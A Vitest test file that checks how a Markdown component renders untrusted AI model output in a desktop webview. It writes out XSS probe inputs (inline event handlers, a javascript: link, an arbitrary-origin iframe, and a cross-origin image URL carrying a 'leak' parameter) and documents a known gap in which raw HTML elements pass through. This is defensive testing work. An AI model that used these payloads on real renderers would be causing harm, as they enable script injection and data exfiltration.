// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import React, { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { Markdown } from "./index";

/**
 * Model output is untrusted input rendered inside the webview that holds the
 * keychain, SQL and screenshot commands. Streamdown parses raw HTML
 * (`allowDangerousHtml` + rehype-raw) and rehype-harden only filters link and
 * image URLs — it does not strip elements. These tests pin down where the real
 * boundary sits today so a renderer swap or a plugin-config change cannot move
 * it silently.
 */

declare global {
  // eslint-disable-next-line no-var
  var __HANDLER_FIRED: string | undefined;
  // Set by React's test utilities contract, not declared in React's types.
  // eslint-disable-next-line no-var
  var IS_REACT_ACT_ENVIRONMENT: boolean | undefined;
}

let container: HTMLDivElement;
let root: Root;

beforeEach(() => {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
  globalThis.__HANDLER_FIRED = undefined;
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
  globalThis.__HANDLER_FIRED = undefined;
});

const render = (markdown: string) => {
  act(() => {
    root.render(React.createElement(Markdown, null, markdown));
  });
  return container;
};

describe("inline event handlers in model output", () => {
  // hast-util-to-jsx-runtime maps `onerror`/`onmouseover` onto React's own
  // `onError`/`onMouseOver` props, so React treats them as synthetic listeners
  // rather than attributes: the string is never written to the DOM and never
  // invoked. This is the load-bearing reason raw HTML is not an XSS today.
  it("never lands an on* handler attribute in the DOM", () => {
    const el = render(
      `<div data-probe="div" onmouseover="globalThis.__HANDLER_FIRED = 'div'">hover</div>`,
    );

    const div = el.querySelector('[data-probe="div"]');
    expect(div).not.toBeNull();
    expect(div?.getAttribute("onmouseover")).toBeNull();
  });

  it("does not execute an img onerror handler", () => {
    const el = render(
      `<img data-probe="img" src="https://example.invalid/p.png" onerror="globalThis.__HANDLER_FIRED = 'img'">`,
    );

    const img = el.querySelector('[data-probe="img"]');
    expect(img).not.toBeNull();
    expect(img?.getAttribute("onerror")).toBeNull();

    // React refuses a string listener rather than calling it, and reports that
    // refusal as an uncaught error inside jsdom's dispatch. That error IS the
    // mechanism under test, so mark it handled instead of letting it fail the
    // run.
    const swallow = (event: Event) => event.preventDefault();
    window.addEventListener("error", swallow);
    try {
      img?.dispatchEvent(new Event("error"));
    } finally {
      window.removeEventListener("error", swallow);
    }
    expect(globalThis.__HANDLER_FIRED).toBeUndefined();
  });
});

describe("URL filtering (rehype-harden)", () => {
  it("blocks javascript: links regardless of scheme casing", () => {
    const el = render(
      `<a data-probe="anchor" href="JAVASCRIPT:globalThis.__HANDLER_FIRED = 'anchor'">click</a>`,
    );

    expect(el.querySelector('[data-probe="anchor"]')).toBeNull();
    expect(el.innerHTML).toContain("blocked");
  });

  it("blocks images whose src cannot be resolved to an absolute URL", () => {
    const el = render(`<img data-probe="img" src="x">`);

    expect(el.querySelector('[data-probe="img"]')).toBeNull();
    expect(el.innerHTML).toContain("Image blocked");
  });
});

describe("known gap: raw elements reach the DOM", () => {
  /**
   * Characterization tests, not desired behavior. rehype-harden passes every
   * non-link/image element straight through, so the CSP in tauri.conf.json is
   * the only control on what these elements can load. When a raw-HTML
   * allow-list lands, these tests SHOULD fail — flip them to `toBeNull()`
   * rather than deleting them.
   *
   * Not covered here: whether an inline <script> from model output executes.
   * jsdom does not run scripts under this config, so that question needs a
   * real webview. Production CSP has no 'unsafe-inline' in script-src, but
   * devCsp does.
   */
  it("renders an iframe pointing at an arbitrary origin", () => {
    const el = render(
      `<iframe data-probe="iframe" src="https://example.invalid/"></iframe>`,
    );

    const iframe = el.querySelector('[data-probe="iframe"]');
    expect(iframe).not.toBeNull();
    expect(iframe?.getAttribute("src")).toBe("https://example.invalid/");
  });

  it("renders an image with an attacker-controlled cross-origin URL", () => {
    const el = render(
      `<img data-probe="img" src="https://example.invalid/pixel.png?k=leak">`,
    );

    const img = el.querySelector('[data-probe="img"]');
    expect(img).not.toBeNull();
    expect(img?.getAttribute("src")).toBe(
      "https://example.invalid/pixel.png?k=leak",
    );
  });
});
